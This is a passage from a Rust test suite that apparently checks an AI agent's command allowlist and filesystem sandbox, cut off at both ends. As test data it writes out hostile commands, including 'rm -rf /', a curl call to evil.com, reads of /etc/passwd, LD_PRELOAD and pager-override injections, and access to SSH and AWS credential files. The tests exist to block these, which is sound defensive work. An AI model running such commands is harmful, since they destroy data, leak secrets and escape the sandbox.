        allowed_commands: vec!["sqlite3".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed(
        "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
    ));
    assert_eq!(
        p.command_risk_level(
            "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
        ),
        CommandRiskLevel::Low
    );
}

#[test]
fn unquoted_semicolon_after_quoted_sql_still_splits_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["sqlite3".into()],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /"));
}

#[test]
fn command_injection_backtick_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo `whoami`"));
    assert!(!p.is_command_allowed("echo `rm -rf /`"));
}

#[test]
fn command_injection_dollar_paren_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
    assert!(!p.is_command_allowed("echo $(rm -rf /)"));
}

#[test]
fn command_with_env_var_prefix() {
    let p = default_policy();
    // "FOO=bar" is the first word — not in allowlist
    assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
}

#[test]
fn command_newline_injection_blocked() {
    let p = default_policy();
    // Newline splits into two commands; "rm" is not in allowlist
    assert!(!p.is_command_allowed("ls\nrm -rf /"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls\necho hello"));
}

#[test]
fn command_injection_and_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls && rm -rf /"));
    assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls && echo done"));
}

#[test]
fn command_injection_or_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls || rm -rf /"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls || echo fallback"));
}

#[test]
fn command_injection_background_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls & rm -rf /"));
    assert!(!p.is_command_allowed("ls&rm -rf /"));
    assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
}

#[test]
fn command_injection_redirect_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
    assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
}

#[test]
fn quoted_ampersand_and_redirect_literals_are_not_treated_as_operators() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo \"A&B\""));
    assert!(p.is_command_allowed("echo \"A>B\""));
}

#[test]
fn command_argument_injection_blocked() {
    let p = default_policy();
    // find -exec is a common bypass
    assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
    assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
    // -execdir / -okdir have identical command-execution semantics — same cwd
    // bypass class, different option spelling.
    assert!(!p.is_command_allowed("find /tmp -maxdepth 1 -name poc_proof.txt -execdir whoami \\;"));
    assert!(!p.is_command_allowed("find /etc -name passwd -okdir head -3 {} \\;"));
    // git config/alias can execute commands
    assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
    assert!(!p.is_command_allowed("git alias.st status"));
    assert!(!p.is_command_allowed("git -c core.editor=calc.exe commit"));
    // Legitimate commands should still work
    assert!(p.is_command_allowed("find . -name '*.txt'"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("git add ."));
}

#[test]
fn dangerous_env_var_prefix_blocked() {
    let p = default_policy();
    // GIT_PAGER / PAGER / GIT_SSH_COMMAND / GIT_EXTERNAL_DIFF / EDITOR all
    // cause git or other allowed binaries to spawn the assigned value as a
    // subprocess. The bare command (`git log`, `git status`, `git diff`)
    // is allowlisted, but the env prefix shifts execution to an arbitrary
    // command.
    assert!(!p.is_command_allowed("GIT_PAGER=/tmp/payload.sh git log"));
    assert!(!p.is_command_allowed("PAGER=calc.exe git log"));
    assert!(!p.is_command_allowed("GIT_SSH_COMMAND=/tmp/x git fetch"));
    assert!(!p.is_command_allowed("GIT_EXTERNAL_DIFF=/tmp/x git diff"));
    assert!(!p.is_command_allowed("EDITOR=/tmp/x git commit"));
    assert!(!p.is_command_allowed("VISUAL=/tmp/x git commit"));
    assert!(!p.is_command_allowed("LESS=/tmp/x cat /etc/passwd"));
    assert!(!p.is_command_allowed("LESSOPEN=/tmp/x cat /etc/passwd"));
    assert!(!p.is_command_allowed("MANPAGER=/tmp/x man bash"));
    assert!(!p.is_command_allowed("BAT_PAGER=/tmp/x bat file"));
    assert!(!p.is_command_allowed("BROWSER=/tmp/x git status"));
    // Loader-override variables let an attacker inject a library into the
    // next process.
    assert!(!p.is_command_allowed("LD_PRELOAD=/tmp/x.so git status"));
    assert!(!p.is_command_allowed("LD_LIBRARY_PATH=/tmp git status"));
    assert!(!p.is_command_allowed("LD_AUDIT=/tmp/x.so git status"));
    assert!(!p.is_command_allowed("DYLD_INSERT_LIBRARIES=/tmp/x.dylib git status"));
    assert!(!p.is_command_allowed("DYLD_LIBRARY_PATH=/tmp git status"));
    assert!(!p.is_command_allowed("DYLD_FORCE_FLAT_NAMESPACE=1 git status"));
    // Shell-evaluation variables.
    assert!(!p.is_command_allowed("BASH_ENV=/tmp/x git status"));
    assert!(!p.is_command_allowed("ENV=/tmp/x git status"));
    assert!(!p.is_command_allowed("PROMPT_COMMAND=/tmp/x git status"));
    assert!(!p.is_command_allowed("IFS=$'\\n' git status"));
    // Python startup hook + path override.
    assert!(!p.is_command_allowed("PYTHONSTARTUP=/tmp/x python3 -V"));
    assert!(!p.is_command_allowed("PYTHONPATH=/tmp python3 -V"));
    // PATH / SHELL overrides redirect resolution of the next binary.
    assert!(!p.is_command_allowed("PATH=/tmp git status"));
    assert!(!p.is_command_allowed("SHELL=/tmp/x git status"));
    // Lower-case spellings still match (env names are case-insensitive
    // by convention here — most shells uppercase them, but the matcher
    // should not be fooled by case folding).
    assert!(!p.is_command_allowed("git_pager=/tmp/x git log"));
    // Case-insensitive: should also catch mixed-case names.
    assert!(!p.is_command_allowed("Ld_PrElOaD=/tmp/x.so git status"));

    // Benign env prefixes still pass: TZ, LANG, LC_ALL, custom names that
    // don't trigger downstream subprocess execution.
    assert!(p.is_command_allowed("TZ=UTC git log"));
    assert!(p.is_command_allowed("LANG=en_US.UTF-8 git log"));
    assert!(p.is_command_allowed("LC_ALL=C git status"));
    assert!(p.is_command_allowed("FOO=bar git status"));
    // No env prefix at all — unchanged.
    assert!(p.is_command_allowed("git status"));
}

#[test]
fn custom_allowlist_cannot_enable_command_executors() {
    let p = SecurityPolicy {
        allowed_commands: vec![
            "echo".into(),
            "xargs".into(),
            "awk".into(),
            "perl".into(),
            "python".into(),
            "python3".into(),
            "python3.12".into(),
            "python.EXE".into(),
            "pythonw3".into(),
            "pythonw3.12.exe".into(),
            "ruby".into(),
            "bash".into(),
            "sh".into(),
            "env".into(),
        ],
        ..SecurityPolicy::default()
    };

    for command in [
        "echo rm -rf / | xargs",
        "awk 'BEGIN{system(\"id\")}'",
        "perl -e 'system \"id\"'",
        "python -c 'import os; os.system(\"id\")'",
        "python3 exploit.py",
        "python3.12 -c 'print(1)'",
        "/usr/bin/python3.12 -c 'print(1)'",
        "C:\\Python312\\python.EXE -c 'print(1)'",
        "pythonw3 exploit.py",
        "C:\\Python312\\pythonw3.12.exe -c 'print(1)'",
        "ruby -e 'system \"id\"'",
        "bash -lc 'id'",
        "sh -c 'id'",
        "/usr/bin/env python3 -c 'print(1)'",
    ] {
        assert!(
            !p.is_command_allowed(command),
            "{command} should remain blocked even when allowlisted"
        );
    }
}

#[test]
fn command_injection_dollar_brace_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo ${IFS}cat${IFS}/etc/passwd"));
}

#[test]
fn command_injection_tee_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret | tee /etc/crontab"));
    assert!(!p.is_command_allowed("ls | /usr/bin/tee outfile"));
    assert!(!p.is_command_allowed("tee file.txt"));
}

#[test]
fn command_injection_process_substitution_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("cat <(echo pwned)"));
    assert!(!p.is_command_allowed("ls >(cat /etc/passwd)"));
}

#[test]
fn command_env_var_prefix_with_allowed_cmd() {
    let p = default_policy();
    // env assignment + allowed command — OK
    assert!(p.is_command_allowed("FOO=bar ls"));
    assert!(p.is_command_allowed("LANG=C grep pattern file"));
    // env assignment + disallowed command — blocked
    assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
}

// -- Edge cases: path traversal -----------------------------------

#[test]
fn path_traversal_encoded_dots() {
    let p = default_policy();
    // Literal ".." in path — always blocked
    assert!(!p.is_path_string_allowed("foo/..%2f..%2fetc/passwd"));
}

#[test]
fn path_traversal_double_dot_in_filename() {
    let p = default_policy();
    // ".." in a filename (not a path component) is allowed
    assert!(p.is_path_string_allowed("my..file.txt"));
    // But actual traversal components are still blocked
    assert!(!p.is_path_string_allowed("../etc/passwd"));
    assert!(!p.is_path_string_allowed("foo/../etc/passwd"));
}

#[test]
fn path_with_null_byte_blocked() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("file\0.txt"));
}

#[test]
fn path_symlink_style_absolute() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("/proc/self/root/etc/passwd"));
}

#[test]
fn path_home_tilde_ssh() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("~/.gnupg/secring.gpg"));
}

#[test]
fn path_var_run_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("/var/run/docker.sock"));
}

// -- Edge cases: rate limiter boundary ----------------------------

#[test]
fn rate_limit_exactly_at_boundary() {
    let p = SecurityPolicy {
        max_actions_per_hour: 1,
        ..SecurityPolicy::default()
    };
    assert!(p.record_action()); // 1 — exactly at limit
    assert!(!p.record_action()); // 2 — over
    assert!(!p.record_action()); // 3 — still over
}

#[test]
fn rate_limit_zero_blocks_everything() {
    let p = SecurityPolicy {
        max_actions_per_hour: 0,
        ..SecurityPolicy::default()
    };
    assert!(!p.record_action());
}

#[test]
fn rate_limit_high_allows_many() {
    let p = SecurityPolicy {
        max_actions_per_hour: 10000,
        ..SecurityPolicy::default()
    };
    for _ in 0..100 {
        assert!(p.record_action());
    }
}

// -- Edge cases: autonomy + command combos ------------------------

#[test]
fn readonly_blocks_even_safe_commands() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        allowed_commands: vec!["ls".into(), "cat".into()],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat"));
    assert!(!p.can_act());
}

#[test]
fn supervised_allows_listed_commands() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["git".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("git status"));
    assert!(!p.is_command_allowed("docker ps"));
}

#[test]
fn full_autonomy_still_respects_forbidden_paths() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("/etc/shadow"));
    assert!(!p.is_path_string_allowed("/root/.bashrc"));
}

// -- Edge cases: from_config preserves tracker --------------------

#[test]
fn from_config_creates_fresh_tracker() {
    let autonomy_config = crate::openhuman::config::AutonomyConfig {
        level: AutonomyLevel::Full,
        workspace_only: false,
        allowed_commands: vec![],
        forbidden_paths: vec![],
        max_actions_per_hour: 10,
        max_cost_per_day_cents: 100,
        require_approval_for_medium_risk: true,
        block_high_risk_commands: true,
        ..crate::openhuman::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);
    assert_eq!(policy.tracker.count(), 0);
    assert!(!policy.is_rate_limited());
}

// =================================================================
// SECURITY CHECKLIST TESTS
// Checklist: inbound surfaces not public, pairing required,
//            filesystem scoped (no /), access via tunnel
// =================================================================

// -- Checklist #3: Filesystem scoped (no /) -----------------------

#[test]
fn checklist_root_path_blocked() {
    let p = default_policy();
    if cfg!(windows) {
        assert!(!p.is_path_string_allowed("C:\\"));
        assert!(!p.is_path_string_allowed("C:\\anything"));
    } else {
        assert!(!p.is_path_string_allowed("/"));
        assert!(!p.is_path_string_allowed("/anything"));
    }
}

#[test]
fn checklist_all_system_dirs_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for dir in [
        "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev",
        "/proc", "/sys", "/var", "/tmp",
    ] {
        assert!(
            !p.is_path_string_allowed(dir),
            "System dir should be blocked: {dir}"
        );
        assert!(
            !p.is_path_string_allowed(&format!("{dir}/subpath")),
            "Subpath of system dir should be blocked: {dir}/subpath"
        );
    }
}

#[test]
fn checklist_sensitive_dotfiles_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for path in [
        "~/.ssh/id_rsa",
        "~/.gnupg/secring.gpg",
        "~/.aws/credentials",
        "~/.config/secrets",
    ] {
        assert!(
            !p.is_path_string_allowed(path),
            "Sensitive dotfile should be blocked: {path}"
        );
    }
}

#[test]
fn checklist_null_byte_injection_blocked() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("safe\0/../../../etc/passwd"));
    assert!(!p.is_path_string_allowed("\0"));
    assert!(!p.is_path_string_allowed("file\0"));
}

#[test]
fn checklist_workspace_only_blocks_all_absolute() {
    let p = SecurityPolicy {
        workspace_only: true,
        ..SecurityPolicy::default()
    };
    if cfg!(windows) {
        assert!(!p.is_path_string_allowed("C:\\any\\absolute\\path"));
    } else {
        assert!(!p.is_path_string_allowed("/any/absolute/path"));
    }
    assert!(p.is_path_string_allowed("relative/path.txt"));
}

#[test]
fn checklist_resolved_path_must_be_in_workspace() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/user/project"),
        ..SecurityPolicy::default()
    };
    // Inside workspace — allowed
    assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
    // Outside workspace — blocked (symlink escape)
    assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
    assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
    // Root — blocked
    assert!(!p.is_resolved_path_allowed(Path::new("/")));
}

#[test]
fn checklist_default_policy_is_workspace_only() {
    let p = SecurityPolicy::default();
    assert!(
        p.workspace_only,
        "Default policy must be workspace_only=true"
    );
}

#[test]
fn checklist_default_forbidden_paths_comprehensive() {
    let p = SecurityPolicy::default();
    // Must contain all critical system dirs
    for dir in ["/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dir),
            "Default forbidden_paths must include {dir}"
        );
    }
    // Must contain sensitive dotfiles
    for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dot),
            "Default forbidden_paths must include {dot}"
        );
    }
}

// -- 1.2 Path resolution / symlink bypass tests -------------------

#[test]
fn resolved_path_blocks_outside_workspace() {
    let workspace = std::env::temp_dir().join("openhuman_test_resolved_path");
    let _ = std::fs::create_dir_all(&workspace);

    // Use the canonicalized workspace so starts_with checks match
    let canonical_workspace = workspace
        .canonicalize()
        .unwrap_or_else(|_| workspace.clone());

    let policy = SecurityPolicy {
        workspace_dir: canonical_workspace.clone(),
        ..SecurityPolicy::default()
    };

    // A resolved path inside the workspace should be allowed
    let inside = canonical_workspace.join("subdir").join("file.txt");
    assert!(
        policy.is_resolved_path_allowed(&inside),
        "path inside workspace should be allowed"
    );

    // A resolved path outside the workspace should be blocked
    let canonical_temp = std::env::temp_dir()
        .canonicalize()
        .unwrap_or_else(|_| std::env::temp_dir());
    let outside = canonical_temp.join("outside_workspace_openhuman");
    assert!(
        !policy.is_resolved_path_allowed(&outside),
        "path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&workspace);
}

#[test]
fn resolved_path_blocks_root_escape() {
    let policy = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/openhuman_user/project"),
        ..SecurityPolicy::default()
    };

    assert!(
        !policy.is_resolved_path_allowed(Path::new("/etc/passwd")),
        "resolved path to /etc/passwd must be blocked"
    );
    assert!(
        !policy.is_resolved_path_allowed(Path::new("/root/.bashrc")),
        "resolved path to /root/.bashrc must be blocked"
    );
}

#[cfg(unix)]
#[test]
fn resolved_path_blocks_symlink_escape() {
    use std::os::unix::fs::symlink;

    let root = std::env::temp_dir().join("openhuman_test_symlink_escape");
    let workspace = root.join("workspace");
    let outside = root.join("outside_target");

    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&workspace).unwrap();
    std::fs::create_dir_all(&outside).unwrap();

    // Create a symlink inside workspace pointing outside
    let link_path = workspace.join("escape_link");
    symlink(&outside, &link_path).unwrap();

    let policy = SecurityPolicy {
        workspace_dir: workspace.clone(),
        ..SecurityPolicy::default()
    };

    // The resolved symlink target should be outside workspace
    let resolved = link_path.canonicalize().unwrap();
    assert!(
        !policy.is_resolved_path_allowed(&resolved),
        "symlink-resolved path outside workspace must be blocked"
    );

    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn is_path_allowed_blocks_null_bytes() {
    let policy = default_policy();
    assert!(
        !policy.is_path_string_allowed("file\0.txt"),
        "paths with null bytes must be blocked"
    );
}

#[test]
fn is_path_allowed_blocks_url_encoded_traversal() {
    let policy = default_policy();
    assert!(
        !policy.is_path_string_allowed("..%2fetc%2fpasswd"),
        "URL-encoded path traversal must be blocked"
    );
    assert!(
        !policy.is_path_string_allowed("subdir%2f..%2f..%2fetc"),
        "URL-encoded parent dir traversal must be blocked"
    );
}

// Regression: #1941. The allowlist-miss Err return used to echo the full
// untruncated command, leaking secrets in args (e.g. an Authorization Bearer
// header in a `curl` invocation that the agent issued). The log already
// truncated at 80 chars; the Err path now matches.
#[test]
fn validate_command_truncates_secrets_in_allowlist_miss_error() {
    // Use a base command NOT on the default allowlist so we hit the
    // allowlist-miss branch. Pad the command so the secret sits past byte 80.
    let prefix = "totallybogusbin --really-long-flag-that-eats-the-budget=";
    let padding = "x".repeat(80usize.saturating_sub(prefix.len()));
    let secret = "Bearer SECRETTOKEN_DO_NOT_LEAK_ME_123";
    let cmd = format!("{prefix}{padding} -H \"Authorization: {secret}\"");
    assert!(
        cmd.len() > 80,
        "fixture must be longer than the 80-char truncation cap"
    );
    assert!(
        cmd.contains(secret),
        "fixture must contain the secret token so the test can check it leaks"
    );

    let p = default_policy();
    let err = p
        .validate_command_execution(&cmd, false)
        .expect_err("unknown command should be rejected");

    assert!(
        !err.contains(secret),
        "Err return leaked the secret past the 80-char truncation boundary: {err}"
    );
    assert!(
        err.starts_with(crate::openhuman::security::POLICY_BLOCKED_MARKER),
        "hard block should lead with the recognizable policy marker: {err}"
    );
    assert!(
        err.contains("Command not allowed by security policy: "),
        "Err return should still carry the policy-decision text: {err}"
    );
}

// Regression: #1941. Mirrors the log-truncation multi-byte safety net (#1813)
// for the Err path. A multi-byte UTF-8 char straddling byte 80 of the command
// would panic the formatter if we did a naked `&command[..80]` slice.
#[test]
fn validate_command_err_truncation_handles_multibyte_char_at_boundary() {
    let prefix = "totallybogusbin ";
    let filler = "a".repeat(80 - prefix.len() - 1);
    let cmd = format!("{prefix}{filler}魔 trailing");
    assert!(
        !cmd.is_char_boundary(80),
        "fixture must place a multi-byte char across byte 80"
    );

    let p = default_policy();
    let result = p.validate_command_execution(&cmd, false);
    assert!(
        result.is_err(),
        "fixture must hit the allowlist-miss Err path"
    );
}

// ── validate_path_within_root ─────────────────────────────────────────────

#[test]
fn validate_path_within_root_allows_contained_path() {
    let root = tempfile::tempdir().unwrap();
    let file = root.path().join("prompt.md");
    std::fs::write(&file, b"hello").unwrap();
    let result = validate_path_within_root(&file, root.path());
    assert!(result.is_ok(), "contained path must be allowed: {result:?}");
    assert_eq!(result.unwrap(), file.canonicalize().unwrap());
}

#[test]
fn validate_path_within_root_blocks_parent_traversal() {
    let root = tempfile::tempdir().unwrap();
    let subdir = root.path().join("prompts");
    std::fs::create_dir(&subdir).unwrap();
    // Create a file one level above the prompts subdir but still within root.
    let victim = root.path().join("secret.txt");
    std::fs::write(&victim, b"secret").unwrap();
    // Construct a traversal path: <root>/prompts/../secret.txt
    let traversal = subdir.join("..").join("secret.txt");
    // With the prompts dir as root, the traversal must be blocked.
    let result = validate_path_within_root(&traversal, &subdir);
    assert!(
        result.is_err(),
        "path escaping root via '..' must be blocked"
    );
}

#[test]
fn validate_path_within_root_blocks_absolute_escape() {
    let root = tempfile::tempdir().unwrap();
    let file = root.path().join("a.md");
    std::fs::write(&file, b"x").unwrap();
    // Use a completely different tempdir as the root — file is outside it.
    let other_root = tempfile::tempdir().unwrap();
    let result = validate_path_within_root(&file, other_root.path());
    assert!(
        result.is_err(),
        "path outside root must be blocked: {result:?}"
    );
}

#[test]
fn validate_path_within_root_fails_on_nonexistent_candidate() {
    let root = tempfile::tempdir().unwrap();
    let missing = root.path().join("does_not_exist.md");
    // canonicalize() will fail — we expect an error, not a panic.
    let result = validate_path_within_root(&missing, root.path());
    assert!(
        result.is_err(),
        "non-existent candidate must return an error"
    );
}

#[test]
fn validate_path_within_root_blocks_symlink_escape() {
    let root = tempfile::tempdir().unwrap();
    let prompts_dir = root.path().join("prompts");
    std::fs::create_dir(&prompts_dir).unwrap();
    // Create a target file outside the prompts dir.
    let outside = root.path().join("outside.txt");
    std::fs::write(&outside, b"sensitive").unwrap();
    // Create a symlink inside prompts/ pointing outside.
    let link = prompts_dir.join("evil.md");
    #[cfg(unix)]
    std::os::unix::fs::symlink(&outside, &link).unwrap();
    #[cfg(not(unix))]
    {
        // Skip symlink test on non-Unix where symlink creation may require
        // elevated privileges.
        return;
    }
    let result = validate_path_within_root(&link, &prompts_dir);
    assert!(
        result.is_err(),
        "symlink escaping prompt root must be blocked"
    );
}

// ── validate_path / validate_parent_path (async) ────────────────────────────

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_outside_workspace() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let secret = outside.path().join("secret.txt");
    std::fs::write(&secret, "secret").unwrap();
    let link = workspace.path().join("link.txt");
    std::os::unix::fs::symlink(&secret, &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("link.txt").await.is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_forbidden_path() {
    let workspace = tempfile::tempdir().unwrap();
    // /etc/hostname is readable on most Unix systems
    let link = workspace.path().join("link");
    std::os::unix::fs::symlink("/etc/hostname", &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["/etc".to_string()],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("link").await.is_err());
}

#[tokio::test]
async fn validate_path_allows_regular_file_in_workspace() {
    let workspace = tempfile::tempdir().unwrap();
    let file = workspace.path().join("data.txt");
    std::fs::write(&file, "hello").unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let result = policy.validate_path("data.txt").await;
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), file.canonicalize().unwrap());
}

#[tokio::test]
async fn validate_path_returns_err_for_nonexistent_path() {
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy.validate_path("does_not_exist.txt").await.is_err());
}

#[tokio::test]
async fn validate_parent_path_allows_new_file() {
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let result = policy.validate_parent_path("newfile.txt").await;
    assert!(result.is_ok());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_blocks_symlinked_parent_dir() {
    let workspace = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let link_dir = workspace.path().join("subdir");
    std::os::unix::fs::symlink(outside.path(), &link_dir).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(policy
        .validate_parent_path("subdir/newfile.txt")
        .await
        .is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_path_blocks_symlink_to_relative_forbidden_entry() {
    // Regression: relative forbidden entries (e.g. "secrets") must match after
    // canonicalization. Before the fix, "secrets" was never resolved against the
    // workspace root, so workspace/link -> workspace/secrets/ passed the check.
    let workspace = tempfile::tempdir().unwrap();
    let secrets_dir = workspace.path().join("secrets");
    std::fs::create_dir_all(&secrets_dir).unwrap();
    let secret_file = secrets_dir.join("token.txt");
    std::fs::write(&secret_file, "s3cr3t").unwrap();
    let link = workspace.path().join("link");
    std::os::unix::fs::symlink(&secrets_dir, &link).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["secrets".to_string()],
        ..SecurityPolicy::default()
    };
    // Direct path into the forbidden dir is blocked.
    assert!(policy.validate_path("secrets/token.txt").await.is_err());
    // Symlink that resolves into the forbidden dir is also blocked.
    assert!(policy.validate_path("link/token.txt").await.is_err());
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_blocks_forbidden_path() {
    // Covers lines 888-896: the forbidden-path check inside validate_parent_path.
    let workspace = tempfile::tempdir().unwrap();
    let secrets_dir = workspace.path().join("secrets");
    std::fs::create_dir_all(&secrets_dir).unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec!["secrets".to_string()],
        ..SecurityPolicy::default()
    };
    // Writing a new file directly into the forbidden dir must be blocked.
    assert!(policy
        .validate_parent_path("secrets/output.csv")
        .await
        .is_err());
}

// ── tilde expansion in validate_path / validate_parent_path ──────────────────

#[cfg(unix)]
#[tokio::test]
async fn validate_path_expands_tilde_before_workspace_join() {
    // ~/... must be resolved against the real home dir, not literally joined onto
    // workspace_dir. With workspace_only:false and no forbidden entries, is_path_string_allowed
    // passes ~/file. After tilde expansion the file is outside the temp workspace, so we
    // expect "Resolved path escapes workspace" — not "Failed to resolve path" (which would
    // indicate the literal ~/... was appended to workspace_dir and canonicalize failed there).
    let workspace = tempfile::tempdir().unwrap();
    let home = dirs::home_dir().unwrap();
    let target = home.join("openhuman_tilde_validate_path_test.txt");
    std::fs::write(&target, "test").unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let err = policy
        .validate_path("~/openhuman_tilde_validate_path_test.txt")
        .await
        .unwrap_err();
    let _ = std::fs::remove_file(&target);
    assert!(
        err.contains("Resolved path escapes workspace"),
        "expected workspace-escape error (tilde correctly expanded); got: {err}"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn validate_parent_path_expands_tilde_before_workspace_join() {
    // Same as above but for validate_parent_path: writing ~/new_file.txt in
    // non-workspace-only mode must escape-check via the real home path, not a literal ~/
    // inside workspace_dir.
    let workspace = tempfile::tempdir().unwrap();
    let policy = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    let err = policy
        .validate_parent_path("~/openhuman_tilde_validate_parent_test.txt")
        .await
        .unwrap_err();
    assert!(
        err.contains("Resolved parent path escapes workspace"),
        "expected workspace-escape error (tilde correctly expanded); got: {err}"
    );
}

// -- trusted_roots allow-list (Phase 1) ---------------------------

use std::fs;
use std::path::Path as StdPath;
use std::path::PathBuf as StdPathBuf;

fn trusted_policy(workspace: StdPathBuf, roots: Vec<TrustedRoot>) -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        workspace_dir: workspace,
        workspace_only: true,
        trusted_roots: roots,
        ..SecurityPolicy::default()
    }
}

/// (workspace_dir, outside_dir) under a fresh temp root.
fn ws_and_outside() -> (tempfile::TempDir, StdPathBuf, StdPathBuf) {
    let tmp = tempfile::tempdir().expect("tempdir");
    let workspace = tmp.path().join("workspace");
    let outside = tmp.path().join("outside");
    fs::create_dir_all(&workspace).unwrap();
    fs::create_dir_all(&outside).unwrap();
    (tmp, workspace, outside)
}

#[tokio::test]
async fn trusted_read_root_allows_read_outside_workspace() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let file = outside.join("data.txt");
    fs::write(&file, "hi").unwrap();
    let policy = trusted_policy(
        workspace,
        vec![TrustedRoot {
            path: outside.to_string_lossy().into_owned(),
            access: TrustedAccess::Read,
        }],
    );
    let resolved = policy.validate_path(file.to_str().unwrap()).await;
    assert!(
        resolved.is_ok(),
        "read in trusted root should succeed: {resolved:?}"
    );
}

#[tokio::test]
async fn trusted_read_root_blocks_write() {
    let (_tmp, workspace, outside) = ws_and_outside();
    let policy = trusted_policy(
        workspace,
